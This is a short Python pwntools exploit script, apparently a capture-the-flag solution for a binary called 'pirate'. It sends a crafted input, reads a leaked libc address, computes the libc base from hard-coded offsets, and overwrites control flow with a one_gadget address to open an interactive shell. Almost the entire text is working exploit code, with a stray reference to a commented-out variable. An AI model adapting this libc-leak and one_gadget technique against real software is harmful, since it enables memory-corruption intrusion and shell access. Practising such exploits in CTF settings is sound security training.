from pwn import *

# Set up pwntools for the correct architecture
#exe = '/tmp/tmpqnk46bmp/pirate'
#context.binary = exe

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)

    elif args['LOCAL']:
        return remote('localhost', 4444)

    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
continue
'''.format(**locals())

io = start()
payload = b'558@ u@u@u@u@u@u@u@u@ 8r (@(@(@(@(@(@(@(@'
io.sendlineafter(b'Yarr be, enter me ye ship: ', payload)

def recv_8():
    info_recv = [io.recv(1) for _ in range(8)]
    info_recv = flat(info_recv)
    info_recv = u64(info_recv)
    return info_recv


libc_leak = recv_8()
log.info('libc leak @ ' + hex(libc_leak))

#Found manually in pwndbg
base_offset = -0x21c87

#Found using one_gadget
one_gadget_offset = 0x4f302


libc_base = libc_leak + base_offset
libc_one_gadget = libc_base + one_gadget_offset
log.info('Libc base @ ' + hex(libc_base))
log.info('One gadget @ ' + hex(libc_one_gadget))


payload = p64(libc_one_gadget)

io.send(payload)

io.interactive()